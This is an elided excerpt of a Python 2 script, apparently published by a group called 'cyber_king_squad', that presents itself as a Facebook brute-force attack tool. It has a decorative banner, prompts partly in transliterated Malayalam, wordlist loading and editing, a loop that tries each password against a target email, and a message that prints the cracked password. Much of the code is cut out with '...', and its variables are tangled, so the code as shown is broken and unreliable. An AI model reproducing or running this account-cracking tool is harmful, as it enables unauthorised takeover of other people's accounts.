...
def banner():
    os.system('clear')
    print " "
    runntxt(GL+"              cyber_King_squad ^_^")
    runntxt(WW+"     ___    ___  _______  _____	 _	")
    runntxt(WW+"    king squad")
    runntxt(GL+"    love my team	")
    runntxt(GG+"    white ...cyber_king_squad	")
    runntxt(Y+" ##########################################")
    runntxt(GG+"########################################## ")
    time.sleep(1.5)
    print GG+"  √=============================================√"
    print GL+"  |••••••   FB BRUTE FORCE ATTACK-CYBER_KING_SQUAD.   ••••••|"
    print GG+"  √=============================================√"
    print WW+"  |            Made BY: RH...KING.              |"
    print GL+"  |    ░C░y░b░e░r░ ░k░i░n░g░ ░s░q░u░a░d░
         |"
    print WW+"  |     FACEBOOK: cyber_king_squad         |"
    print Y+"  |             YouTube: cyber_king squad           |"
    print GL+"  |---------------------------------------------|"
    print GL+"  |        cyber king squad... [ ^_^ ]         |"
    print GL+"  |---------------------------------------------|"
    print GG+"  √=============================================√"
    print GL+"  |•••••••••   Rh_@king  {*_*}       •••••••••|"
    print GG+"  √=============================================√"
...
print " "
print "\033[92m╭────\033[91m[ \033[96mPASSWORD File Wordlist \033[95m( Rh.pass.txt ) \033[91;1m]"
...
def pil():
                print GG+" "
                g = str(raw_input("[?] Try cyber,_squad team..\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 kingbrute.py')
                elif g == 'n' or g == 'N':
                    print wd+".....king......"
                    sys.exit()
                else:
                    print RR+"Enna pinne povale..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Wordlistil passwords add cheyyano...? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"Vendel  Venda..."
                sys.exit()

        else:
                print RR+"Enthuvaadeyy..."
                edit_wordlist()
...
def main():
        ...
        life()
        print " "
        print RR+" *_* Wordlist undo..Undel Nokkane..."
        print " "
def hari(Rh_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m #@R!-W@!T!NG-4-P@$$ ==> \033[91m[\033[90;1m"+Rh_password)
	sys.stdout.flush()
	...
	if mask != login and (not 'login_attempt' in mask):
			...
			print "          P A S S W O R D  F I N D "
	         	...
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(Rh_password)
        	        print " "
        	        raw_input(WW+"#*---KITTIYALLO-*-SAHO THAN PWOLIYAADO---*#")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print wd+"Stop.......NIRTHIYO CHAKKARE....NTHUPATTY..?"
      edit_wordlist()
      sys.exit()    	    
def life():
	global Rh_password
	...
	for hari_password in password_nob:
		password_nob = Rh_password.replace("\n","")
		hari(Rh_password)		
         ...
         `:o:``....--        ..     `:o:`
           `:+/-`  `-        ..  `-/+:`
              `-/+///..````..://+/-`
                ...
                \033[90;1mLife Of Hacker\033[91;1m
             Powered by:\033[97m cyber_king_squad
      """
         ...
         print wd+" [#] FB _*_ Cracking\033[97;1m.........."
         print " "
